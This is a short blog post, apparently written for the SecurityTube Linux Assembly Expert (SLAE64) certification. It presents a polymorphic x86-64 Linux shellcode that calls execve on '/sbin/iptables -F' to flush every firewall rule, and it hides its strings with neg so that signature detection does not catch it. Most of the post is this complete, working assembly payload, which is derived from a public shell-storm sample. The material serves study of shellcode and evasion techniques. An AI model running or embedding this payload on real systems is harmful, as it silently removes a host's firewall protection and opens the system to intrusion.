# Polymorphic version of a flush iptables shellcode

Original shellcode:
```
http://shell-storm.org/shellcode/files/shellcode-683.php
```

The original shellcode is 49 bytes in size and my polymorphic version is 59 bytes in size.

## Changes
1. Use of cdq to null out rdx
2. The original source code uses ```shr``` to deobfuscate strings at runtime. I used ```neg``` to deobfuscate.

## Asm
```
global _start
section .text
_start:

    xor rax, rax
    cdq
    push rax
    push word 0xb9d3 ; Negotiated "-F"
    mov rcx, rsp ; rcp has the deobfuscated string
    neg word [rcx] ; Deobfuscate -F

    mov rbx,0xffff8c9a939d9e8c ; Obfuscated part of /sbin/iptables
    push rbx
    mov rbx,0x8f96d091969d8cd1 ; Obfuscated part of /sbin/iptables
    push rbx
    mov rdi, rsp ; rdi does not point to the obfusctated string

    neg qword [rsp]  ; Deobfuscate /sbin/iptables
    neg qword [rsp + 8] ; Deobfuscate /sbin/iptables

    push rax ; Put a nullbyte on the stack
    push rcx ; Put deobfuscated "-F" on stack
    push rdi ; Put deobfuscated "/sbin/iptables" on stack

    mov rsi, rsp ; rsi does now point to the first element of argv on the stack

    mov al, 0x3b ; Finally call execve("/sbin/iptables", [ "/sbin/iptables", "-F", NULL ], 0)
    syscall

```

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification.

http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert

Student ID: SLAE64-1581
